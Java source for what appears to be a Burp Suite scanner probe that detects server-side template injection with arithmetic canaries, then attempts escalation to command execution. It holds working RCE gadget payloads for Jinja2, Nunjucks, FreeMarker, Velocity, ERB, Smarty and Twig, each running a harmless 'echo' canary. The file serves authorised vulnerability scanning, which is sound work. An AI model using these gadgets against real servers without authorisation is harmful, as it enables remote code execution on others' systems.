package com.ioactive.aiscanner.scan;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.RequestOptions;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.ioactive.aiscanner.scan.sast.SourceFindings;
import com.ioactive.aiscanner.scan.sast.StaticHint;
import com.ioactive.aiscanner.ui.ScanLog;


/**
 * Deterministic Server-Side Template Injection (SSTI, CWE-1336) — the gap left by {@link CommandInjectionProbe},
 * which only injects BARE arithmetic ({@code 8161*7919}) that a template engine won't evaluate outside its
 * delimiters. This probe injects a distinctive product WRAPPED in every major engine's delimiters and confirms
 * with an arithmetic canary: if the COMPUTED product appears in the response — but the literal payload does NOT
 * (so it wasn't merely reflected) and it was absent from the baseline — the engine evaluated our expression.
 * Zero-FP: a unique product that only server-side evaluation could produce. SSTI is routinely escalatable to RCE.
 *
 * <p>Generic: it fuzzes discovered request parameters (and SAST-flagged template sinks); no app-specific paths.
 * Covers Jinja2/Twig/Nunjucks ({@code {{}}}), FreeMarker/JSP-EL/Thymeleaf/Velocity/JS ({@code ${}}), Ruby/Thymeleaf
 * ({@code #{}}), ERB/EJS ({@code <%= %>}) and bare-brace engines.</p>
 */
public final class SstiProbe extends Probe {

    private SourceFindings sourceHints;

    // Distinctive operands (separate from CommandInjectionProbe's so findings don't collide); the product is
    // COMPUTED from them — never a hand-typed literal — so the oracle value can't drift from the payload.
    private static final long A = 73331L, B = 24499L;
    private static final long PRODUCT = A * B;
    private static final String EXPR = A + "*" + B;
    private static final String[] PAYLOADS = {
            "{{" + EXPR + "}}",        // Jinja2 / Twig / Nunjucks / Django
            "${" + EXPR + "}",         // FreeMarker / JSP-EL / Thymeleaf / Velocity / JS template literal
            "#{" + EXPR + "}",         // Ruby (Slim/ERB attr) / Thymeleaf
            "<%= " + EXPR + " %>",     // ERB / EJS
            "{" + EXPR + "}",          // bare-brace (some engines / format-string)
            "${{" + EXPR + "}}",       // Spring/Handlebars polyglot
    };

    // RCE-escalation canary: a unique token COMPUTED from the operands (never hand-typed), distinct from PRODUCT so
    // it can't collide with the arithmetic oracle. Emitted by a shell `echo` inside an engine RCE gadget — if the
    // token appears in the response (and the literal gadget did NOT), only server-side COMMAND EXECUTION could have
    // produced it. Runs ONLY after SSTI is already confirmed, so the extra requests are rare and targeted.
    private static final String CANARY = "sx" + (A + B * 7) + "xs";
    private static final String[] RCE_GADGETS = {
            // Jinja2 / Flask (Python) — {{ }}
            "{{cycler.__init__.__globals__.os.popen('echo " + CANARY + "').read()}}",
            "{{lipsum.__globals__.os.popen('echo " + CANARY + "').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('echo " + CANARY + "').read()}}",
            // Nunjucks (JS) — {{ }}
            "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo " + CANARY + "')\")()}}",
            // FreeMarker (Java) — ${ }
            "${\"freemarker.template.utility.Execute\"?new()(\"echo " + CANARY + "\")}",
            // Velocity (Java) — #set
            "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",$e.getClass()).invoke($e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"echo " + CANARY + "\")",
            // ERB (Ruby) — <%= %>
            "<%=`echo " + CANARY + "`%>",
            // Smarty (PHP)
            "{system('echo " + CANARY + "')}",
            // Twig (PHP) — {{ }} filter chain
            "{{['echo " + CANARY + "']|filter('system')}}",
    };

    public SstiProbe(MontoyaApi api, ScanLog scanLog) {
        super(api, scanLog);
    }

    public void setSourceHints(SourceFindings hints) { this.sourceHints = hints; }

    /** Test each URL/BODY parameter of a discovered request for SSTI. Returns true on the first confirmed hit. */
    public boolean probe(HttpRequest req) {
        try {
            if (req == null || !req.hasParameters()) return false;
            HttpRequestResponse base = send(req);
            String baseBody = base != null && base.response() != null ? base.response().bodyToString() : null;
            if (baseBody != null && baseBody.contains(String.valueOf(PRODUCT))) return false;   // product already present → FP guard
            String prov = prov(req.url());
            for (ParsedHttpParameter p : req.parameters()) {
                if (p.type() != HttpParameterType.URL && p.type() != HttpParameterType.BODY) continue;
                for (String payload : PAYLOADS) {
                    HttpRequestResponse r = send(setParam(req, p.name(), p.type(), payload));
                    if (r == null || r.response() == null) continue;
                    String b = r.response().bodyToString();
                    if (b == null) continue;
                    // COMPUTED (product present) but NOT merely reflected (literal payload absent) ⇒ the engine ran it.
                    if (b.contains(String.valueOf(PRODUCT)) && !b.contains(payload)) {
                        scanLog.found("Server-Side Template Injection (SSTI)", req.url(),
                                "Parameter '" + p.name() + "' is evaluated by a server-side template engine: injecting "
                              + payload + " returned the COMPUTED product " + PRODUCT + " (the literal payload was NOT "
                              + "reflected, and the product was absent from the baseline) — the engine executed our "
                              + "expression (CWE-1336), routinely escalatable to RCE. Deterministic: a unique arithmetic "
                              + "product computed server-side." + prov, r);
                        scanLog.incFinding();
                        // Confirmed SSTI is routinely escalatable to RCE — try a curated set of engine gadgets that
                        // shell out an `echo <canary>`, and report a DISTINCT, higher-severity finding if the canary
                        // executes. Best-effort: a wrong-engine gadget simply won't emit the canary (no FP).
                        escalateToRce(req, p.name(), p.type(), baseBody);
                        return true;
                    }
                }
            }
        } catch (Throwable t) {
            scanLog.debug("SSTI probe error: " + t);
        }
        return false;
    }

    /** After SSTI is confirmed on (param,type), attempt OS-command execution via engine RCE gadgets that echo a
     *  unique canary. Reports a distinct "SSTI → RCE" finding if the canary appears in the response but the literal
     *  gadget does not (execution, not reflection). Never a false positive: only a shell-emitted canary passes. */
    private boolean escalateToRce(HttpRequest req, String param, HttpParameterType type, String baseBody) {
        try {
            if (baseBody != null && baseBody.contains(CANARY)) return false;   // canary already present → can't attribute
            for (String gadget : RCE_GADGETS) {
                HttpRequestResponse r = send(setParam(req, param, type, gadget));
                if (r == null || r.response() == null) continue;
                String b = r.response().bodyToString();
                if (b == null) continue;
                // Canary present (shell echo OUTPUT) but the literal gadget NOT reflected ⇒ the command executed.
                if (b.contains(CANARY) && !b.contains(gadget)) {
                    // Name it as OS COMMAND EXECUTION so cross-channel dedup (ScanLog.familyKey) keys it to the
                    // "cmdi" family — a DISTINCT, higher-impact finding from the "ssti" arithmetic proof on the same
                    // endpoint (a "…template injection…" name would collapse into the SSTI family and vanish).
                    scanLog.found("OS command execution via server-side template injection (RCE)", req.url(),
                            "Parameter '" + param + "' — the confirmed SSTI escalates to arbitrary OS COMMAND EXECUTION: "
                          + "the engine gadget `" + gadget + "` ran `echo " + CANARY + "` and its output " + CANARY
                          + " appeared in the response (absent from the baseline; the literal gadget was NOT reflected) "
                          + "— remote code execution on the server (CWE-94). Deterministic: a unique canary emitted by a "
                          + "shell command, not reflection.", r);
                    scanLog.incFinding();
                    return true;
                }
            }
        } catch (Throwable t) {
            scanLog.debug("SSTI→RCE escalation error: " + t);
        }
        return false;
    }

    private HttpRequest setParam(HttpRequest req, String name, HttpParameterType type, String value) {
        return req.withUpdatedParameters(HttpParameter.parameter(name, value, type));
    }

    // send(HttpRequest) inherited from Probe (politeness + configured request timeout).

    /** Provenance suffix when a source-analysis SSTI/template sink matches this url (else empty). */
    private String prov(String url) {
        if (sourceHints == null) return "";
        for (StaticHint h : sourceHints.all())
            if (("SSTI".equalsIgnoreCase(h.vulnClass) || "template".equalsIgnoreCase(h.sinkType))
                    && (!h.hasEndpoint() || h.matchesUrl(url))) return "  " + h.provenance();
        return "";
    }
}
